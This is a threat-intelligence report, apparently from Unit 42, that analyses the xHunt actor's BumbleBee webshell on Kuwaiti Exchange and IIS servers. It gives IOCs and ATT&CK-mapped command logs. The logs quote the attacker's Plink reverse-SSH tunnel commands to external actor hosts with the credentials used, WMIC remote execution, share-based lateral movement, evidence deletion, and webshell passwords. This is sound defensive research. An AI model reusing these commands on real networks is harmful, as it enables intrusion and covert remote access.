{
    "id": "23272b2c-00cb-4dae-b09c-a68fd8ef90b6",
    "created_at": "2022-10-25T16:48:14.132342Z",
    "updated_at": "2025-03-27T02:16:04.53985Z",
    "deleted_at": null,
    "sha1_hash": "d236226592ada17c3181d9c1eb42f6f6ca52f9bc",
    "title": "",
    "authors": "",
    "file_creation_date": "2022-08-15T07:40:37Z",
    "file_modification_date": "2022-08-15T07:40:37Z",
    "file_size": 2444011,
    "plain_text": "# xHunt Campaign: New BumbleBee Webshell and SSH Tunnels Used for Lateral Movement\n\n**[unit42.paloaltonetworks.com/bumblebee-webshell-xhunt-campaign](https://unit42.paloaltonetworks.com/bumblebee-webshell-xhunt-campaign/)**\n\nJanuary 11, 2021\n\n[By Robert Falcone](https://unit42.paloaltonetworks.com/author/robertfalcone/)\n\nJanuary 11, 2021 at 12:01 AM\n\n[Category: Unit 42](https://unit42.paloaltonetworks.com/category/unit-42/)\n\n[Tags: BumbleBee, remote desktop, webshell, xHunt](https://unit42.paloaltonetworks.com/tag/bumblebee/)\n\n[This post is also available in: 日本語 (Japanese)](https://unit42.paloaltonetworks.jp/bumblebee-webshell-xhunt-campaign/)\n\n## Executive Summary\n\nIn September 2020, we began investigating a Microsoft Exchange server at a Kuwaiti\norganization that a threat group compromised as part of a continued xHunt campaign.\n[This investigation resulted in the discovery of two new backdoors called TriFive and](https://unit42.paloaltonetworks.com/xhunt-campaign-backdoors/)\nSnugy, which we discussed in a prior blog, as well as a new webshell that we call\nBumbleBee that we will explain in greater detail in this blog. We use this name because\nthe color scheme of the BumbleBee webshell includes white, black and yellow, as seen in\nFigure 1.\n\n\n-----\n\nThe actor used the BumbleBee webshell to upload and download files to and from the\ncompromised Exchange server, but more importantly, to run commands that the actor\nused to discover additional systems and to move laterally to other servers on the network.\nWe found BumbleBee hosted on an internal Internet Information Services (IIS) web\nserver on the same network as the compromised Exchange server, as well as on two\ninternal IIS web servers at two other Kuwaiti organizations. As mentioned in our prior\nxHunt Campaign blog, we still do not know the initial infection vector used to\ncompromise the Exchange server, as this appears to have occurred prior to the logs we\nwere able to collect.\n\nWe observed the actor interacting directly with the BumbleBee webshell on the\ncompromised Exchange server of the Kuwaiti organization, as this server was accessible\nfrom the internet. The actor used Virtual Private Networks (VPNs) provided by Private\nInternet Access when directly accessing BumbleBee on internet-accessible servers. The\nactor would frequently switch between different VPN servers to change the external IP\naddress of the activity that the server would store in the logs. Specifically, the actor\nchanged the IP address to appear to be from different countries, including Belgium,\nGermany, Ireland, Italy, Luxembourg, the Netherlands, Poland, Portugal, Sweden and the\nUnited Kingdom. We believe this is an attempt to evade detection and make analysis of\nthe malicious activities more difficult. We also observed the actor switching between\ndifferent operating systems and browsers, specifically Mozilla Firefox or Google Chrome\non Windows 10, Windows 8.1 or Linux systems. This suggests the actor has access to\nmultiple systems and uses this to make analysis of the activities more difficult, or that\nthere are multiple actors involved, who have differing preferences for operating systems\nand browsers.\n\nIn addition to using VPNs, the actor used SSH tunnels to interact with BumbleBee\nwebshells hosted on internal IIS web servers that are not accessible directly from the\ninternet at all three Kuwaiti organizations. The commands executed on the servers via\nBumbleBee suggest that the actor used the PuTTY Link (Plink) tool to create SSH tunnels\nto access services internal to the compromised network. We observed the actor using\nPlink to create an SSH tunnel for TCP port 3389, which suggests that the actor used the\ntunnel to access the system using Remote Desktop Protocol (RDP). We also observed the\nactor creating SSH tunnels to internal servers for TCP port 80, which suggests the actor\nused the tunnel to access internal IIS web servers. We believe that the actor accessed\nthese additional internal IIS web servers to leverage file uploading functionality in\ninternal web applications to install BumbleBee as a method of lateral movement.\n\n[Palo Alto Networks Next-Generation Firewall customers are protected from these xHunt-](https://www.paloaltonetworks.com/network-security/next-generation-firewall)\n[related attacks with Threat Prevention, URL Filtering and DNS Security subscriptions.](https://www.paloaltonetworks.com/products/secure-the-network/subscriptions/threat-prevention)\n\n## BumbleBee Webshell\n\n\n-----\n\nThe threat group involved in the xHunt campaign compromised an Exchange server at a\nKuwaiti organization and installed a webshell that we call BumbleBee. We call the\nwebshell BumbleBee because the color scheme of the webshell includes white, black and\nyellow, as seen in Figure 1. BumbleBee is pretty straightforward. It allows an attacker to\nexecute commands and upload and download files to and from the server. The interesting\npart of BumbleBee is that it requires an actor to supply one password to view the webshell\nand a second password to interact with the webshell.\n\nFigure 1. BumbleBee webshell used by xHunt actor to run commands on Microsoft Exchange Server.\n\nTo view the BumbleBee webshell, the actor must provide a password in a URL parameter\nnamed parameter. Otherwise, the form used to interact with BumbleBee will not display\nin the browser. To check the supplied password for authentication, the webshell will\ngenerate an MD5 hash of the parameter value and check it with a hardcoded MD5 hash,\nwhich in the BumbleBee sample hosted on the compromised Exchange server we\nobserved was an MD5 hash of 1B2F81BD2D39E60F1E1AD05DD3BF9F56 for the\npassword string fkeYMvKUQlA5asR. Once displayed, BumbleBee provides the actor three\nmain functionalities:\n\n1. Executing commands via cmd /c\n2. Uploading files to the server to a specified folder (c:\\windows\\temp by default).\n3. Download files from the server.\n\nTo carry out any of these functions, the actor must supply a second password (in the field\nwith the added “password” label in Figure 1). The BumbleBee webshell will generate an\nMD5 hash of the password and check it with a hardcoded MD5 hash before carrying out\nthe functionality. The MD5 hash checked prior to carrying out the actor’s desired actions\nwas 36252C6C2F616C5664A54058F33EF463, but we were unfortunately unable to\n\n\n-----\n\ndetermine the string form of this password. While we did not know the password required\nto use BumbleBee’s functionality, we were able to determine the commands executed via\nthe webshell by analyzing logs from the compromised Exchange server, which we will\ndiscuss in detail in a later section of this blog.\n\nWhile carrying out our analysis, we found a second BumbleBee webshell that contained\ndifferent MD5 hashes for viewing the webshell and executing commands, which were\nA2B4D934D394B54672EA10CA8A65C198 and\n28D968F26028D956E6F1199092A1C408, respectively. We determined that the hash of\nA2B4D934D394B54672EA10CA8A65C198 was for the password TshuYoOARg3fndI, but\nwe were unable to determine the string for the second hash. This webshell was hosted at\nan internal IIS web server at the same Kuwaiti organization where the original\nBumbleBee was found on a compromised Exchange server. We also found this specific\nBumbleBee sample hosted on internal IIS web servers at two other organizations in\nKuwait. We were able to collect endpoint logs from an internal IIS web server at one of\nthe two Kuwaiti organizations to determine the commands executed via BumbleBee,\nwhich we will also discuss in a later section of this blog.\n\n## Interactions With Compromised Microsoft Exchange Server\n\nTo determine the actor’s activities regarding the compromised Exchange server of a\nKuwaiti organization, we collected IIS server logs from the Exchange server and the logs\ngenerated for the system by Cortex XDR. Within the IIS logs, we were able to observe the\nHTTP POST requests generated when the actor issued commands via the BumbleBee\nwebshell installed on the compromised Exchange server. Using the IIS logs, we were also\nable to observe the actor logging into a compromised email account via Outlook Web App\nand carrying out specific activities once logged in, such as viewing emails and searching\nfor other email accounts on the compromised network.\n\nUnfortunately, the compromised Exchange server cannot log the data within the POST\nrequests, so while we know how many commands were issued from these logs, we do not\nknow the actual commands that the actor executed. Also, we were only able to collect 34\ndays’ worth of logs from the period between Jan. 31, 2020, and Sept. 16, 2020, which did\nnot include all the IIS logs from the compromised Exchange server. Due to these large\ngaps in logs, we do not have a complete picture of the activity or even visibility into the\nbeginning of the actor’s interactions with the compromised Exchange server. For\nexample, the IIS logs show the first BumbleBee webshell activity on Feb. 1, 2020, but they\nalso show the TriFive backdoor logging into a compromised email account every five\nminutes starting at 12:02 AM UTC on Jan. 31, 2020. The TriFive beacons every five\nminutes suggest it was repeatedly running via the scheduled task discussed in our\n[previous blog on the backdoors related to this incident, which also suggests that the actor](https://unit42.paloaltonetworks.com/xhunt-campaign-backdoors/)\nhad already gained sustained access to the compromised Exchange server before what our\ncollected logs show.\n\n\n-----\n\nUsing the IIS logs we were able to collect from the compromised Exchange server, we\nwere able to put together a timeline of the actor’s activity, including interactions with the\nBumbleBee webshell. On Feb. 1 and July 27, 2020, the actor logged into the Exchange\nserver via Outlook Web App using compromised credentials. The actor used the search\nfunctionality within Outlook Web App to search for email addresses, including searching\nfor the domain name of the compromised Kuwaiti organization to get a full list of email\naddresses, as well as specific keywords, such as helpdesk. We also saw the actor viewing\nemails in the compromised account’s inbox, specifically emails from service providers and\ntechnology vendors. Additionally, the actor viewed alert emails from a Symantec product\nand Fortinet’s FortiWeb product. The act of searching for emails to the helpdesk and\nviewing security alert emails suggests that the threat actor was interested in determining\nwhether the Kuwaiti organization had become aware of the malicious activities.\n\nIn regard to the BumbleBee webshell activity, the important pieces of information in the\nIIS logs used to generate a timeline were:\n\nTimestamp of the HTTP requests.\nActor’s IP address.\nUser-agent in HTTP request provides the actor’s operating system and browser\nversion.\nClientId in the URL parameters is a unique identifier for the client provided by the\nExchange server via a server-side cookie.\n\nTable 1 in the Appendix provides the timeline of activity regarding the actor’s use of the\nBumbleBee webshell, which began on Feb. 1, 2020, according to the logs we were able to\ncollect. While creating this timeline, we noticed a few interesting observables and\nbehaviors exhibited by the actor when interacting with BumbleBee, including:\n\nAll but one of the IP addresses used by the actor are associated with a VPN provided\nby Private Internet Access, with the other IP address belonging to FalcoVPN.\nThe actor switched between VPN servers in different locations to change IP address\nand to appear to originate from different countries, specifically Belgium, Germany,\nIreland, Italy, Luxembourg, the Netherlands, Poland, Portugal, Sweden and the\nUnited Kingdom.\nThe actor used a combination of operating systems and browsers when interacting\n\nwith BumbleBee, specifically FireFox ( ) or Chrome ( ) on Windows 10 (\n\n), Windows 8.1 ( ) or Linux systems ( ).\n\n## Commands Executed via BumbleBee\n\nAs we previously mentioned, the compromised Exchange server of a Kuwaiti organization\ndoes not log the POST data within the IIS logs, so we were unable to extract the\ncommands run on the BumbleBee webshell. However, we used overlapping timestamps to\ncorrelate the activity in the IIS logs with the command prompt activity seen in Cortex\n\n\n-----\n\nXDR logs to determine the commands executed on the server. Unfortunately, we did not\nhave visibility into the commands executed on BumbleBee until Sept. 16, 2020, when\nCortex XDR was installed on the compromised Exchange server in response to the\nsuspicious activity. We were also able to determine the commands run on the BumbleBee\nwebshell hosted on the internal IIS web server at one of the two other Kuwaiti\norganizations as well.\n\nBased on the Cortex XDR logs, the actor spent three hours and 37 minutes on Sept. 16,\n2020, running commands via the BumbleBee webshell installed on the compromised\nExchange server. Table 2 in the Appendix shows all the commands and the MITRE\nATT&CK technique identifiers that best describe the activities carried out. The commands\nshow the actor:\n\n[1. Performing network discovery (T1018) using ping and net group commands, as well](https://attack.mitre.org/techniques/T1018/)\n\n[as PowerShell (T1059.001), to find additional computers on the network.](https://attack.mitre.org/techniques/T1059/001/)\n[2. Performing account discovery (T1087) using the whoami and quser commands.](https://attack.mitre.org/techniques/T1087/)\n[3. Determining the system time (T1124) using the W32tm and time commands.](https://attack.mitre.org/techniques/T1124/)\n[4. Creating an SSH tunnel (T1572) using Plink (RTQ.exe) to a remote host.](https://attack.mitre.org/techniques/T1572/)\n\n[5. Using RDP (T1021.001) over the SSH tunnel to control the compromised computer.](https://attack.mitre.org/techniques/T1021/001/)\n[6. Laterally moving (T1570) to another system by mounting a shared folder, copying](https://attack.mitre.org/techniques/T1570/)\n\nPlink (RTQ.exe) to a remote system and using Windows Management\n[Instrumentation (WMI) (T1047) to create an SSH tunnel for RDP access.](https://attack.mitre.org/techniques/T1047/)\n[7. Removing evidence of their presence by deleting (T1070.004) BumbleBee after they](https://attack.mitre.org/techniques/T1070/004/)\n\nwere done issuing commands.\n\nThe commands listed in Table 2 in the Appendix also show the actor using Plink\n(RTQ.exe) to create an SSH tunnel to an external IP address 192.119.110[.]194, as seen in\nthe following command:\n\necho y | c:\\windows\\temp\\RTQ.exe 192.119.110[.]194 -C -R 0.0.0.0:8081:<redacted IP\n#2>:3389 -l bor -pw 123321 -P 443\n\nThe IP address overlaps with other related infrastructure that we will discuss in a later\nsection of this blog. Most importantly, the username and password of bor and 123321\nused to create the SSH tunnel overlaps directly with prior xHunt activity. These exact\n[credentials were listed within the cheat sheet found within the Sakabota tool, which](https://unit42.paloaltonetworks.com/xhunt-actors-cheat-sheet/)\nprovided an example command that the actor could use to create SSH tunnels using\nPlink. We believe the actor used the example command from the cheat sheet as a basis for\nthe commands they used to create the SSH tunnels via BumbleBee.\n\nThe actor creates these SSH tunnels to connect to non-internet accessible RDP services\non the Windows system, specifically to use RDP to interact with the compromised system\nand to use Graphical User Interface (GUI) applications. The actor also uses these SSH\ntunnels to move laterally to other systems on the network, specifically to access internal\nsystems that are not remotely accessible from the internet, as depicted in Figure 2.\n\n\n-----\n\nFigure 2. Visualization of xHunt actor accessing an internal system from an SSH tunnel created on the\n\ninternet accessible server hosting BumbleBee.\n\nIn addition to analyzing commands executed on the compromised Exchange server, we\nalso analyzed the commands executed on the BumbleBee webshell at an internal IIS web\nserver hosted at one of the two other Kuwaiti organizations. On Sept. 10, 2020, we found\nthat the actor ran several commands to perform network and user account discovery.\nAdditionally, the actor used BumbleBee to upload a second webshell with a filename of\ncq.aspx. The actor used this second webshell to run a PowerShell script that issued SQL\nqueries to a Microsoft SQL Server database.\n\nThe actor first issued a SQL query to check the version of SQL server, followed by the\nactor issuing two additional queries that were very specific to the web application running\non the IIS web server. The PowerShell script used to issue the SQL queries is very similar\nto scripts that were included in a Microsoft Technet forum post titled Running SQL via\nPowerShell, which suggests the actor may have used this forum post as a basis for the\nPowerShell script. We were unable to obtain the second webshell, as the actor deleted it\nvia the BumbleBee webshell when they were finished. Table 3 in the Appendix shows the\ncommands executed via BumbleBee on Sept. 10, 2020.\n\nThe logs on the IIS web server hosting the BumbleBee webshell used to issue the\ncommands in Table 3 only included internal IP addresses for the source of the activity.\nThe internal IP addresses suggested this web server was not publicly accessible and did\nnot expose the actor’s source IP address. However, all of the attempts to access\nBumbleBee and run the commands in Table 3 had 192.119.110[.]194:8083 as the host in\nthe URL of the referrer field within the web server logs. This external IP address in the\nreferrer field suggests that the actor was accessing BumbleBee via an SSH tunnel. The IP\naddress in the referrer field is also the same as in the command issued to create the SSH\ntunnels for RDP access that we observed on the compromised Exchange server, as shown\nin Table 2.\n\n## File Uploader and SSH Tunnels\n\nDuring our research, we found a second BumbleBee webshell that was hosted on an\ninternal IIS web server at the initial Kuwaiti organization, as well as on internal IIS web\nservers at two other Kuwaiti organizations. This BumbleBee webshell had different\n\n\n-----\n\npasswords to view and run commands compared to the first sample we analyzed. The\nsecond BumbleBee webshell required the actor to include the password\nTshuYoOARg3fndI within a URL parameter aptly named parameter. As with the initial\nBumbleBee sample, we do not know the password the actor must include to be able to run\ncommands on the webshell.\n\nBy analyzing artifacts on the internal IIS web server, we were able to determine that on\nJuly 16, 2020, the actor ran similar commands to create SSH tunnels using Plink as those\nseen in Table 2 in the Appendix. We determined the actor executed commands that use\n[the same username and password as seen in the xHunt cheat sheet, but with a different](https://unit42.paloaltonetworks.com/xhunt-actors-cheat-sheet/)\nexternal IP address controlled by the actor, as in the following:\n\n1.exe 142.11.211[.]79 -C -R 0.0.0.0:8080:10.x.x.x:80 -l bor -pw 123321 -P 443\n\nSVROOT.exe 142.11.211[.]79 -C -R 0.0.0.0:8081:10.x.x.x:80 -l bor -pw 123321 -P 443\n\nThese commands differ from those used to create the SSH tunnel on the compromised\nExchange server that allowed the actor to connect to the server using RDP over TCP port\n3389. The commands above attempt to create a tunnel to allow the actor to access web\nservers hosted at other internal servers over TCP port 80. We believe the actor used these\nSSH tunnels to gain access to web servers on other internal networks with hopes of\nfinding similar file uploading functionality on those servers. If found, we believe the actor\nwould use the file uploading functionality to upload a webshell to compromise the remote\nserver for lateral movement.\n\nWe checked the IIS logs that contained BumbleBee webshell activity and found three\nexternal IP addresses within the URLs of the referrer field of inbound HTTP requests. The\npresence of these IP addresses in the referrer field suggests that the actor used the SSH\ntunnels to access the web servers by including the following IP and TCP ports in the URL\nfield of their browser:\n\n142.11.211[.]79:8080\n\n142.11.211[.]79:8081\n\n91.92.109[.]59:1234\n\n91.92.109[.]59:1255\n\n91.92.109[.]59:1288\n\n91.92.109[.]59:1289\n\n192.119.110[.]194:8083\n\n## Related xHunt Infrastructure\n\n\n-----\n\nThe inbound requests to the BumbleBee webshell hosted on the compromised Exchange\nserver did not provide any decent pivot points to other xHunt infrastructure, as all the\nexternal IP addresses were of VPN servers the actor used when interacting with the\nwebshell. Fortunately, we were able to extract known xHunt infrastructure used as the\nremote servers for the SSH tunnels that the actor created to access systems via RDP and\ninternal web services. The three external servers used for the SSH tunnels were\n192.119.110[.]194, 142.11.211[.]79 and 91.92.109[.]59, which provided overlaps with other\ninfrastructure seen in the chart in Figure 3.\n\nFigure 3. Infrastructure associated with xHunt servers used for SSH tunnels.\n\nThese three IP addresses used for the remote location of the SSH tunnel resolved to the\ndomains ns1.backendloop[.]online and ns2.backendloop[.]online. More recently, these\ntwo domains have resolved to an IP address of 192.255.166[.]158, which may suggest that\nthe actor is using a server at this IP address in current operations. The 91.92.109[.]59 IP\n\n\n-----\n\naddress also resolved to various subdomains on the following domains, suggesting that\nthey are also part of the actor’s infrastructure:\nbackendloop[.]online\n\nbestmg[.]info\nwindowsmicrosofte[.]online\n\nThe domain windowsmicrosofte[.]online contains the substring microsofte, which was\nseen in the Hisoka C2 domain of microsofte-update[.]com as mentioned in our initial\npublication on xHunt’s attacks on Kuwaiti shipping and transportation organizations.\nUnfortunately, we have not seen any of these domains used by the actor within our\ntelemetry, so we cannot determine their purpose within the actor’s operations.\n\n## Conclusion\n\nThe xHunt campaign continues as the actor installed a webshell we call BumbleBee on a\ncompromised Exchange server of a Kuwaiti organization, which we found hosted on an\ninternal IIS web server on the same network. We also discovered BumbleBee on two\ninternal IIS web servers at two other Kuwaiti organizations as well. While we know the\nactor used the file uploading functionality of a web application to install BumbleBee onto\ninternal IIS web servers, we are still unsure if the actor installed BumbleBee on the\ncompromised Exchange server by exploiting a vulnerability or by moving laterally from\nanother system on the network.\n\nThe actor used BumbleBee to run commands on the compromised servers at the three\nKuwaiti organizations, including commands to discover user accounts and other systems\non the network, as well as commands to move laterally to other systems on the network.\nAdditionally, the actor created SSH tunnels to access systems via RDP and to access\ninternal web servers from external servers controlled by the actor. The actor used the\nsame username and password for the SSH tunnels that we observed within the cheat\nsheet included in the Sakabota tool, which was developed and exclusively used by the\nactor.\n\nThe external servers used by the actor for the SSH tunnels were seen in activity at two of\nthe three Kuwaiti organizations, which suggests this actor reuses infrastructure when\ninteracting with multiple target networks. These external servers also resolved to several\nrelated domains, suggesting that they are not only used to establish SSH tunnels, but used\nmore generally for infrastructure across other portions of their operations.\n\nFrom this analysis, we determined that the actor prefers to use VPNs provided by Private\nInternet Access when interacting directly with the targeted networks to conceal their true\nlocation. The actor would also switch VPN servers often while issuing commands on the\nwebshell to make the activity appear to originate in many different countries. The actors\nalso used a VPN when logging into compromised email accounts on the Exchange server\nof the Kuwaiti organization, in which they specifically looked for helpdesk-related emails\nand emails generated by security alerts. The attempts to conceal their location and the\n\n\n-----\n\nfocus on viewing emails that might notify administrators of the compromised network of\nthe attacker’s presence may explain how the actor was able to maintain a presence on the\ncompromised network for many months.\n\nPalo Alto Networks Next-Generation Firewall customers are protected from the attacks\noutlined in this blog with the following security subscriptions:\n\nThreat Prevention signatures “BumbleBee Webshell File Detection” and\n“BumbleBee Webshell Command and Control Traffic Detection” detects BumbleBee\nwebshell activity.\nActor’s related infrastructure has been categorized as malicious in URL Filtering\nand DNS Security.\n\n## Additional Resources\n\n Appendix\n\n**Indicators of Compromise**\n\nbackendloop[.]online\n\nbestmg[.]info\nwindowsmicrosofte[.]online\n\n**BumbleBee Webshell Activity on Exchange Server**\n\n\n**Start**\n**Time**\n\n**(UTC)**\n\n2/1/20\n10:47\n\n2/1/20\n11:37\n\n2/1/20\n12:38\n\n2/1/20\n12:58\n\n\n**Commands** **IP Address** **Client ID** **OS and**\n**Browser**\n**from**\n**User**\n**Agent**\n\n0 77.243.191[.]20 POQSBWBKAHZLRWNZFVPG\n\n12 185.220.70[.]144 RCWIWFL0MCDGZKGO0A\n\n0 193.176.86[.]134 RCWIWFL0MCDGZKGO0A\n\n75 82.102.21[.]219 NCHOOJMDGUYAOWZVXJQDG\n\n\n-----\n\n6/28/20\n11:09\n\n7/25/20\n7:56\n\n7/25/20\n10:44\n\n7/25/20\n13:59\n\n7/26/20\n6:43\n\n7/26/20\n7:41\n\n7/26/20\n11:26\n\n7/27/20\n4:52\n\n7/27/20\n10:31\n\n9/6/20\n10:58\n\n9/8/20\n6:37\n\n9/8/20\n8:22\n\n\n3 89.26.241[.]70 ITKVJLNUKULNR0PBAWQ\n\n0 23.92.127[.]18 IJFHUUAID0FGS9YQEMHCG\n\n15 196.52.84[.]35 IJAJGSWXUWVDVMMUHQQ\n\n7 196.52.84[.]52 IJAJGSWXUWVDVMMUHQQ\n\n3 185.220.70[.]139 IJAJGSWXUWVDVMMUHQQ\n\n4 185.230.127[.]233 IJAJGSWXUWVDVMMUHQQ\n\n5 185.230.127[.]239 IJAJGSWXUWVDVMMUHQQ\n\n1 193.176.86[.]170 IJAJGSWXUWVDVMMUHQQ\n\n3 212.102.52[.]134 IJAJGSWXUWVDVMMUHQQ\n\n0 212.102.35[.]102 IIARASUWFCYUBMI0NA\n\n24 196.52.84[.]30 QAFCNW0FN0ENKWGZPEPVW\n\n0 185.230.127[.]238 HKPBNWFKIYLNWUGAHJA\n\n\n-----\n\n9/8/20\n8:48\n\n9/8/20\n11:40\n\n9/8/20\n13:31\n\n9/9/20\n5:57\n\n9/10/20\n18:58\n\n9/12/20\n7:13\n\n9/12/20\n10:29\n\n9/15/20\n0:04\n\n9/15/20\n5:28\n\n9/15/20\n10:45\n\n9/15/20\n11:24\n\n9/15/20\n13:24\n\n\n0 185.230.127[.]238 <several unique>\n\n9 185.230.127[.]238 QAFCNW0FN0ENKWGZPEPVW\n\n1 212.102.52[.]134 QAFCNW0FN0ENKWGZPEPVW\n\n3 89.238.139[.]52 QAFCNW0FN0ENKWGZPEPVW\n\n24 195.181.170[.]242 QAFCNW0FN0ENKWGZPEPVW\n\n26 89.238.137[.]37 QAFCNW0FN0ENKWGZPEPVW\n\n2 212.102.52[.]134 QAFCNW0FN0ENKWGZPEPVW\n\n7 92.223.89[.]137 QAFCNW0FN0ENKWGZPEPVW\n\n2 85.203.46[.]99 OWITUR9UOKSZPXDKFBW\n\n5 185.246.208[.]197 YEHIZAWKCLYFMDS9Q\n\n1 77.243.191[.]20 VOICHQVTFKIDXTCAKA\n\n4 92.223.89[.]134 QAFCNW0FN0ENKWGZPEPVW\n\n\n-----\n\n9/15/20\n13:30\n\n9/15/20\n14:49\n\n9/15/20\n15:13\n\n9/15/20\n15:17\n\n9/15/20\n15:17\n\n9/15/20\n15:17\n\n9/15/20\n15:24\n\n9/15/20\n15:24\n\n9/16/20\n5:32\n\n9/16/20\n13:42\n\n9/16/20\n14:33\n\n9/16/20\n14:34\n\n\n6 185.246.208[.]197 YEHIZAWKCLYFMDS9Q\n\n3 92.223.89[.]136 QAFCNW0FN0ENKWGZPEPVW\n\n3 89.238.139[.]52 QAFCNW0FN0ENKWGZPEPVW\n\n1 195.181.170[.]243 QAFCNW0FN0ENKWGZPEPVW\n\n1 89.238.139[.]52 QAFCNW0FN0ENKWGZPEPVW\n\n7 195.181.170[.]243 QAFCNW0FN0ENKWGZPEPVW\n\n3 89.238.139[.]52 QAFCNW0FN0ENKWGZPEPVW\n\n1 195.181.170[.]243 QAFCNW0FN0ENKWGZPEPVW\n\n56 84.17.55[.]68 YEHIZAWKCLYFMDS9Q\n\n6 46.246.3[.]254 INAYIKTWB0WGQOW0SRHWAQ\n\n0 46.246.3[.]254 QAFCNW0FN0ENKWGZPEPVW\n\n9 46.246.3[.]254 INAYIKTWB0WGQOW0SRHWAQ\n\n\n-----\n\n9/16/20\n15:44\n\n9/16/20\n16:15\n\n9/16/20\n16:17\n\n9/16/20\n17:21\n\n\n52 46.246.3[.]253 QAFCNW0FN0ENKWGZPEPVW\n\n2 46.246.3[.]254 INAYIKTWB0WGQOW0SRHWAQ\n\n13 46.246.3[.]253 QAFCNW0FN0ENKWGZPEPVW\n\n1 46.246.3[.]254 QAFCNW0FN0ENKWGZPEPVW\n\n\n_Table 1. Actor activity using BumbleBee webshell on compromised Exchange server._\n\n**Commands Executed via BumbleBee on Exchange Server**\n\n\n**Time**\n**(UTC) on**\n**9/16/2020**\n\n\n**Command Executed** **ATT&CK**\n**IDs**\n\n\n13:42:12 ping -n 1 -a <redacted IP #1> [T1018](https://attack.mitre.org/techniques/T1018/)\n\n13:42:27 quser /server:dc.<redacted root domain> [T1087](https://attack.mitre.org/techniques/T1087/)\n\n14:27:39 ipconfig /all [T1016](https://attack.mitre.org/techniques/T1016/)\n\n14:27:51 W32tm /query /computer:<redacted IP #1> /configuration [T1124](https://attack.mitre.org/techniques/T1124/)\n\n14:29:06 W32tm /query /computer:<redacted IP #1> /configuration [T1124](https://attack.mitre.org/techniques/T1124/)\n\n14:34:25 quser /server:<redacted IP #1> [T1087](https://attack.mitre.org/techniques/T1087/)\n\n\n14:36:57 echo y | echo q | echo y | echo q | echo y | echo q |echo y |\necho q | echo y | echo q | echo y | echo q | time\n\n14:37:11 echo y | echo q | echo y | echo q | echo y | echo q |echo y |\necho q | echo y | echo q | echo y | echo q | time\n\n\n[T1124](https://attack.mitre.org/techniques/T1124/)\n\n[T1124](https://attack.mitre.org/techniques/T1124/)\n\n\n14:43:34 quser /server:<redacted IP #1> [T1087](https://attack.mitre.org/techniques/T1087/)\n\n14:43:53 quser /server:<redacted IP #2> [T1087](https://attack.mitre.org/techniques/T1087/)\n\n14:49:14 quser /server:<redacted IP #1> [T1087](https://attack.mitre.org/techniques/T1087/)\n\n\n14:49:33 quser <redacted username #1> /server:<redacted hostname\n#1>\n\n\n[T1087](https://attack.mitre.org/techniques/T1087/)\n\n\n15:43:13 ipconfig /all [T1016](https://attack.mitre.org/techniques/T1016/)\n\n\n-----\n\n15:43:21 quser /server:<redacted IP #1> [T1087](https://attack.mitre.org/techniques/T1087/)\n\n15:44:53 dir c:\\windows\\temp\\*.exe [T1083](https://attack.mitre.org/techniques/T1083/)\n\n\n15:45:15 echo y | c:\\windows\\temp\\RTQ.exe 192.119.110[.]194 -C -R\n0.0.0.0:8081:<redacted IP #2>:3389 -l bor -pw 123321 -P\n443\n\n\n[T1572,](https://attack.mitre.org/techniques/T1572/)\n[T1021.001](https://attack.mitre.org/techniques/T1021/001/)\n\n\n15:45:26 whoami [T1033](https://attack.mitre.org/techniques/T1033/)\n\n\n15:45:32 echo y | c:\\windows\\temp\\RTQ.exe 192.119.110[.]194 -C -R\n0.0.0.0:8081:<redacted IP #2>:3389 -l bor -pw 123321 -P\n443\n\n\n[T1572,](https://attack.mitre.org/techniques/T1572/)\n[T1021.001](https://attack.mitre.org/techniques/T1021/001/)\n\n\n15:46:11 c:\\windows\\temp\\RTQ.exe [T1059.003](https://attack.mitre.org/techniques/T1059/003/)\n\n15:46:21 whoami /priv [T1033](https://attack.mitre.org/techniques/T1033/)\n\n15:48:15 net group \"Domain Computers\" /domain [T1069](https://attack.mitre.org/techniques/T1069/)\n\n15:48:35 ping -n 1 <redacted hostname #2> [T1018](https://attack.mitre.org/techniques/T1018/)\n\n\n15:49:30 net use \\<redacted IP #3>\\C$ /user:<redacted domain>\\\n<redacted username #2> <redacted password #1>\n\n15:50:22 copy c:\\windows\\temp\\RTQ.exe \\<redacted IP\n#3>\\C$\\windows\\temp\\RTQ.exe\n\n\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n[T1560,](https://attack.mitre.org/techniques/T1570/)\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n\n15:50:28 \\<redacted IP #3>\\C$\\windows\\temp\\RTQ.exe [T1059.003,](https://attack.mitre.org/techniques/T1059/003/)\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n\n15:51:59 wmic /node:\"<redacted IP #3>\" /user:<redacted domain>\\\n<redacted username #2> /PASSWORD:<redacted password\n#1> process call create \"cmd.exe /c\nc:\\windows\\temp\\RTQ.exe >> C:\\windows\\temp\\r.txt\"\n\n\n[T1047](https://attack.mitre.org/techniques/T1047/)\n\n\n15:52:22 type \\<redacted IP #3>\\C$\\windows\\temp\\r.txt [T1039,](https://attack.mitre.org/techniques/T1039/)\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n\n15:53:36 wmic /node:\"<redacted IP #3>\" /user:<redacted domain>\\\n<redacted username #2> /PASSWORD:<redacted password\n#1> process call create \"cmd.exe /c\nc:\\windows\\temp\\RTQ.exe 192.119.110[.]194 -C -R\n0.0.0.0:8082:<redacted IP #2>:3389 -l bor -pw 123321 -P\n443\"\n\n15:55:14 wmic /node:\"<redacted IP #3>\" /user:<redacted domain>\\\n<redacted username #2> /PASSWORD:<redacted password\n#1> process call create \"cmd.exe /c\nc:\\windows\\temp\\RTQ.exe 192.119.110[.]194 -C -R\n0.0.0.0:8084:0.0.0.0:3389 -l bor -pw 123321 -P 443\"\n\n\n[T1047,](https://attack.mitre.org/techniques/T1047/)\n[T1572,](https://attack.mitre.org/techniques/T1572/)\n[T1021.001](https://attack.mitre.org/techniques/T1021/001/)\n\n[T1047,](https://attack.mitre.org/techniques/T1047/)\n[T1572,](https://attack.mitre.org/techniques/T1572/)\n[T1021.001](https://attack.mitre.org/techniques/T1021/001/)\n\n\n15:56:55 del \\<redacted IP #3>\\C$:\\windows\\temp\\RTQ.exe [T1070.004,](https://attack.mitre.org/techniques/T1070/004/)\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n\n-----\n\n15:57:03 del \\<redacted IP #3>\\C$\\windows\\temp\\RTQ.exe [T1070.004,](https://attack.mitre.org/techniques/T1070/004/)\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n15:57:10 del \\<redacted IP #3>\\C$\\windows\\temp\\RTQ.exe /F 